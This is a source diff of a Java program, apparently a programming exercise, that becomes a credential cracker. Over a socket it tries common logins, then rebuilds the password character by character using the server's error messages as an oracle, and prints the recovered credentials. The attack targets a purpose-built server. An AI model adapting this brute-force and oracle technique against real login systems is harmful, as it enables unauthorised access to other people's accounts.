@@ -1,11 +1,14 @@
 package hacker.app;
 
-import hacker.auth.Password;
+import hacker.auth.Login;
+import hacker.auth.Req;
+import hacker.auth.RotDial;
+import hacker.models.UserCredentials;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.net.Socket;
-import java.net.UnknownHostException;
+import java.util.stream.Collectors;
 
 public final class App {
 
@@ -18,7 +21,8 @@ public final class App {
 
   // CRUD-R
 
-  public static void main(String[] rawArgs) throws UnknownHostException {
+  @SuppressWarnings("PMD.AvoidReassigningLoopVariables")
+  public static void main(String[] rawArgs) throws Exception {
     var args = Args.parse(rawArgs);
 
     // Create a new socket
@@ -29,35 +33,61 @@ public final class App {
       sock.setSoTimeout(
           SO_TIMEOUT);  // Set a timeout to prevent indefinite waiting
 
-      System.err.println("Connected successfully. Sending result...");
+      System.err.println("Connected successfully. Sending message...");
 
-      // Send a result from the third command line argument to the host
-      // using the socket
       try (var dataOut = new DataOutputStream(sock.getOutputStream());
           var dataIn = new DataInputStream(sock.getInputStream());
-          var pwdsIter = Password.casefulTypicalPwdsIter()) {
-        while (pwdsIter.hasNext()) {
-          try {
-            String curPwd = pwdsIter.next();
-            dataOut.writeUTF(curPwd);
-            dataOut.flush();
-
-            String response = dataIn.readUTF();
-            if (response.equals("Connection success!")) {
-              System.out.println(curPwd);
-              break;
-            }
-          } catch (Exception e) {
-            throw new RuntimeException(e);
+          var loginIter = Login.typicalLoginIter()) {
+        // Auth details to crack
+        var crackedCredentials = new UserCredentials(null, null);
+        // Crack the login
+        while (true) {
+          // Login must be found before an exhaustion of the iterator.
+          assert loginIter.hasNext();
+          var curLogin = loginIter.next();
+          var curCredentials = crackedCredentials.withLogin(curLogin);
+          var authResp = Req.authenticate(dataIn, dataOut,
+              curCredentials);
+          if (!authResp.message().equals("Wrong login!")) {
+            System.err.printf("Found login = %s\n", curLogin);
+            crackedCredentials = curCredentials;
+            break;
           }
         }
-      } catch (Exception e) {
-        System.err.println("Error during communication: " + e.getMessage());
+        // Crack the password
+        var padlock = RotDial.constructDialsAsm(1);
+        for (var foundPwd = false; !foundPwd; ) {
+          String curPwd = padlock.stream()
+              .map(pIter -> pIter.peek().toString())
+              .collect(Collectors.joining());
+          var response = hacker.auth.Req.authenticate(dataIn, dataOut,
+              crackedCredentials.withPassword(curPwd));
+          switch (response.message()) {
+            case "Wrong password!":
+              padlock.get(padlock.size() - 1).next();
+              break;
+            case "Exception happened during login":
+              // Found the first characters
+              padlock.add(RotDial.construct());
+              break;
+            case "Connection success!":
+              crackedCredentials = crackedCredentials.withPassword(curPwd);
+              System.err.println("Found password = " + curPwd);
+              foundPwd = true;
+              break;
+            default:
+              throw new IllegalStateException(
+                  "Unexpected response: " + response);
+          }
+        }
+        System.out.print(crackedCredentials.toJsonString());
+      } catch (RuntimeException e) {
+        System.err.println("Error during communication: ");
+        throw e;
       }
-
-    } catch (
-        IOException e) {
-      System.err.println("Connection error: " + e.getMessage());
+    } catch (IOException e) {
+      System.err.println("Connection error: ");
+      throw e;
     }
   }
 }
